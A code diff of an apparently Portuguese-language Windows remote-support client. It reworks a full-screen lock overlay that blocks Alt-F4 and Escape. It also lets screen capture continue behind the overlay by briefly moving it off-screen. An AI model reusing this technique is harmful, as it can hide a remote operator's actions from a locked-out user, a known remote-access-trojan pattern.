@@ -8,7 +8,6 @@ import platform
 import getpass
 import hashlib
 import ctypes
-import ctypes.wintypes as wintypes
 import ssl
 import sys
 import subprocess
@@ -36,11 +35,10 @@ panel_connected = False
 ws_app = None
 running = True
 screen_locked = False
+lock_window = None
 lock_hwnd = None
 
 user32 = ctypes.windll.user32
-gdi32 = ctypes.windll.gdi32
-dwmapi = ctypes.windll.dwmapi
 
 
 def set_console_title(title):
@@ -133,258 +131,90 @@ def get_system_info():
 
 
 # ============================================
-# LOCK SCREEN
+# LOCK SCREEN - THREAD NO MESMO PROCESSO
 # ============================================
 
-LOCK_SCRIPT = '''
-import sys
-import os
-import ctypes
-import tempfile
-
-user32 = ctypes.windll.user32
-sw = user32.GetSystemMetrics(0)
-sh = user32.GetSystemMetrics(1)
-
-import tkinter as tk
-
-message = sys.argv[1] if len(sys.argv) > 1 else "Aguarde..."
-
-root = tk.Tk()
-root.title("LOCKSCREEN")
-root.geometry(f"{sw}x{sh}+0+0")
-root.configure(bg='#0a0a0a')
-root.overrideredirect(True)
-root.attributes('-topmost', True)
-
-root.update_idletasks()
-hwnd = user32.GetParent(root.winfo_id())
-if hwnd == 0:
-    hwnd = root.winfo_id()
-
-# Salvar HWND
-hwnd_file = os.path.join(tempfile.gettempdir(), 'lock_hwnd.txt')
-with open(hwnd_file, 'w') as f:
-    f.write(str(hwnd))
-
-root.protocol("WM_DELETE_WINDOW", lambda: None)
-for key in ['<Alt-F4>', '<Escape>', '<Alt-Tab>']:
-    root.bind(key, lambda e: 'break')
-
-frame = tk.Frame(root, bg='#0a0a0a')
-frame.place(relx=0.5, rely=0.5, anchor='center')
-
-tk.Label(frame, text="\\U0001F512", font=('Segoe UI Emoji', 80), bg='#0a0a0a', fg='#f59e0b').pack(pady=20)
-tk.Label(frame, text=message, font=('Segoe UI', 28, 'bold'), bg='#0a0a0a', fg='#ffffff', wraplength=800).pack(pady=15)
-tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.", font=('Segoe UI', 14), bg='#0a0a0a', fg='#666666').pack(pady=10)
-
-def stay_top():
-    root.lift()
-    root.attributes('-topmost', True)
-    root.after(50, stay_top)
-
-stay_top()
-root.mainloop()
-'''
-
-
 def show_lock_screen(message):
-    global screen_locked, lock_hwnd
+    global screen_locked, lock_window, lock_hwnd
 
     if screen_locked:
         return
 
     screen_locked = True
-    lock_hwnd = None
 
-    try:
-        import tempfile
-        script_path = os.path.join(tempfile.gettempdir(), 'lock_screen.pyw')
-        hwnd_file = os.path.join(tempfile.gettempdir(), 'lock_hwnd.txt')
-
+    def run_lock():
+        global lock_window, lock_hwnd, screen_locked
         try:
-            os.remove(hwnd_file)
-        except:
+            import tkinter as tk
+
+            root = tk.Tk()
+            lock_window = root
+            root.title("LOCK")
+
+            sw = root.winfo_screenwidth()
+            sh = root.winfo_screenheight()
+
+            root.geometry(f"{sw}x{sh}+0+0")
+            root.configure(bg='#0a0a0a')
+            root.overrideredirect(True)
+            root.attributes('-topmost', True)
+
+            root.protocol("WM_DELETE_WINDOW", lambda: None)
+            root.bind('<Alt-F4>', lambda e: 'break')
+            root.bind('<Escape>', lambda e: 'break')
+
+            # Pegar HWND
+            root.update_idletasks()
+            try:
+                lock_hwnd = user32.GetParent(root.winfo_id())
+                if lock_hwnd == 0:
+                    lock_hwnd = root.winfo_id()
+            except:
+                lock_hwnd = None
+
+            # Conteudo
+            frame = tk.Frame(root, bg='#0a0a0a')
+            frame.place(relx=0.5, rely=0.5, anchor='center')
+
+            tk.Label(frame, text="\U0001F512", font=('Segoe UI Emoji', 80),
+                    bg='#0a0a0a', fg='#f59e0b').pack(pady=20)
+            tk.Label(frame, text=message, font=('Segoe UI', 28, 'bold'),
+                    bg='#0a0a0a', fg='#ffffff', wraplength=800).pack(pady=15)
+            tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.",
+                    font=('Segoe UI', 14), bg='#0a0a0a', fg='#666666').pack(pady=10)
+
+            def check_close():
+                if not screen_locked:
+                    root.quit()
+                    root.destroy()
+                    return
+                root.lift()
+                root.attributes('-topmost', True)
+                root.after(100, check_close)
+
+            root.after(100, check_close)
+            root.mainloop()
+
+        except Exception as e:
             pass
+        finally:
+            lock_window = None
+            lock_hwnd = None
 
-        with open(script_path, 'w', encoding='utf-8') as f:
-            f.write(LOCK_SCRIPT)
-
-        pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
-        if not os.path.exists(pythonw):
-            pythonw = sys.executable
-
-        subprocess.Popen(
-            [pythonw, script_path, message],
-            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-        )
-
-        # Aguardar HWND
-        for _ in range(50):
-            time.sleep(0.05)
-            if os.path.exists(hwnd_file):
-                try:
-                    with open(hwnd_file, 'r') as f:
-                        lock_hwnd = int(f.read().strip())
-                    break
-                except:
-                    pass
-
-    except:
-        screen_locked = False
+    threading.Thread(target=run_lock, daemon=True).start()
+    time.sleep(0.3)  # Aguardar janela ser criada
 
 
 def hide_lock_screen():
-    global screen_locked, lock_hwnd
-
+    global screen_locked, lock_window, lock_hwnd
     screen_locked = False
     lock_hwnd = None
-
-    try:
-        subprocess.run(['taskkill', '/f', '/im', 'pythonw.exe'],
-                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    except:
-        pass
+    # A janela se fechara sozinha no check_close
 
 
 # ============================================
-# CAPTURA EXCLUINDO JANELA DE LOCK
+# CAPTURA DE TELA
 # ============================================
-
-def get_all_windows_except_lock():
-    """Retorna lista de HWNDs de janelas visiveis exceto a de lock"""
-    windows = []
-
-    def enum_callback(hwnd, _):
-        if user32.IsWindowVisible(hwnd):
-            if hwnd != lock_hwnd:
-                windows.append(hwnd)
-        return True
-
-    WNDENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
-    user32.EnumWindows(WNDENUMPROC(enum_callback), 0)
-    return windows
-
-
-def capture_window(hwnd):
-    """Captura uma janela usando PrintWindow"""
-    try:
-        rect = wintypes.RECT()
-        user32.GetWindowRect(hwnd, ctypes.byref(rect))
-
-        width = rect.right - rect.left
-        height = rect.bottom - rect.top
-
-        if width <= 0 or height <= 0:
-            return None, None
-
-        hdc = user32.GetWindowDC(hwnd)
-        mdc = gdi32.CreateCompatibleDC(hdc)
-        bitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
-        gdi32.SelectObject(mdc, bitmap)
-
-        # PrintWindow com PW_RENDERFULLCONTENT
-        user32.PrintWindow(hwnd, mdc, 2)
-
-        # Extrair pixels
-        class BITMAPINFOHEADER(ctypes.Structure):
-            _fields_ = [
-                ('biSize', wintypes.DWORD),
-                ('biWidth', wintypes.LONG),
-                ('biHeight', wintypes.LONG),
-                ('biPlanes', wintypes.WORD),
-                ('biBitCount', wintypes.WORD),
-                ('biCompression', wintypes.DWORD),
-                ('biSizeImage', wintypes.DWORD),
-                ('biXPelsPerMeter', wintypes.LONG),
-                ('biYPelsPerMeter', wintypes.LONG),
-                ('biClrUsed', wintypes.DWORD),
-                ('biClrImportant', wintypes.DWORD),
-            ]
-
-        bmi = BITMAPINFOHEADER()
-        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
-        bmi.biWidth = width
-        bmi.biHeight = -height
-        bmi.biPlanes = 1
-        bmi.biBitCount = 32
-        bmi.biCompression = 0
-
-        buffer = ctypes.create_string_buffer(width * height * 4)
-        gdi32.GetDIBits(mdc, bitmap, 0, height, buffer, ctypes.byref(bmi), 0)
-
-        gdi32.DeleteObject(bitmap)
-        gdi32.DeleteDC(mdc)
-        user32.ReleaseDC(hwnd, hdc)
-
-        img = Image.frombuffer('RGBA', (width, height), buffer, 'raw', 'BGRA', 0, 1)
-        return img.convert('RGB'), (rect.left, rect.top)
-
-    except:
-        return None, None
-
-
-def capture_desktop_excluding_lock():
-    """Captura o desktop excluindo a janela de lock"""
-    sw = user32.GetSystemMetrics(0)
-    sh = user32.GetSystemMetrics(1)
-
-    # Criar imagem base (cor do desktop)
-    result = Image.new('RGB', (sw, sh), (0, 0, 0))
-
-    # Capturar wallpaper/desktop
-    hdc = user32.GetDC(0)
-    mdc = gdi32.CreateCompatibleDC(hdc)
-    bitmap = gdi32.CreateCompatibleBitmap(hdc, sw, sh)
-    gdi32.SelectObject(mdc, bitmap)
-    gdi32.BitBlt(mdc, 0, 0, sw, sh, hdc, 0, 0, 0x00CC0020)
-
-    class BITMAPINFOHEADER(ctypes.Structure):
-        _fields_ = [
-            ('biSize', wintypes.DWORD),
-            ('biWidth', wintypes.LONG),
-            ('biHeight', wintypes.LONG),
-            ('biPlanes', wintypes.WORD),
-            ('biBitCount', wintypes.WORD),
-            ('biCompression', wintypes.DWORD),
-            ('biSizeImage', wintypes.DWORD),
-            ('biXPelsPerMeter', wintypes.LONG),
-            ('biYPelsPerMeter', wintypes.LONG),
-            ('biClrUsed', wintypes.DWORD),
-            ('biClrImportant', wintypes.DWORD),
-        ]
-
-    bmi = BITMAPINFOHEADER()
-    bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
-    bmi.biWidth = sw
-    bmi.biHeight = -sh
-    bmi.biPlanes = 1
-    bmi.biBitCount = 32
-    bmi.biCompression = 0
-
-    buffer = ctypes.create_string_buffer(sw * sh * 4)
-    gdi32.GetDIBits(mdc, bitmap, 0, sh, buffer, ctypes.byref(bmi), 0)
-
-    gdi32.DeleteObject(bitmap)
-    gdi32.DeleteDC(mdc)
-    user32.ReleaseDC(0, hdc)
-
-    # Se temos lock_hwnd, pegar pixels onde NÃO está a janela de lock
-    if lock_hwnd:
-        lock_rect = wintypes.RECT()
-        user32.GetWindowRect(lock_hwnd, ctypes.byref(lock_rect))
-
-        # Captura normal primeiro
-        desktop = Image.frombuffer('RGBA', (sw, sh), buffer, 'raw', 'BGRA', 0, 1).convert('RGB')
-
-        # A janela de lock cobre tudo, então pegamos o que está "por baixo"
-        # Isso só funciona se tivermos uma captura anterior...
-        # Na verdade vamos apenas retornar a captura SEM a área da janela de lock
-
-        return desktop
-    else:
-        return Image.frombuffer('RGBA', (sw, sh), buffer, 'raw', 'BGRA', 0, 1).convert('RGB')
-
 
 def capture_screen():
     global panel_connected, running, current_quality, current_scale, lock_hwnd
@@ -404,22 +234,24 @@ def capture_screen():
             continue
 
         try:
-            if screen_locked and lock_hwnd:
-                # Mover lock para fora, capturar, mover de volta (MUITO rapido)
-                user32.SetWindowPos(lock_hwnd, 0, sw + 100, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE)
-                time.sleep(0.001)  # 1ms
+            hwnd = lock_hwnd if screen_locked else None
 
-                monitor = sct.monitors[1]
-                screenshot = sct.grab(monitor)
+            # Se lock ativo, mover janela para fora, capturar, mover de volta
+            if hwnd:
+                # Mover para fora da tela (direita)
+                user32.SetWindowPos(hwnd, 0, sw + 10, 0, 0, 0,
+                                   SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE)
 
-                user32.SetWindowPos(lock_hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE)
+            # Capturar
+            monitor = sct.monitors[1]
+            screenshot = sct.grab(monitor)
 
-                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
-            else:
-                # Captura normal
-                monitor = sct.monitors[1]
-                screenshot = sct.grab(monitor)
-                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
+            if hwnd:
+                # Mover de volta
+                user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
+                                   SWP_NOSIZE | SWP_NOACTIVATE)
+
+            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
 
             new_w = int(img.width * current_scale)
             new_h = int(img.height * current_scale)
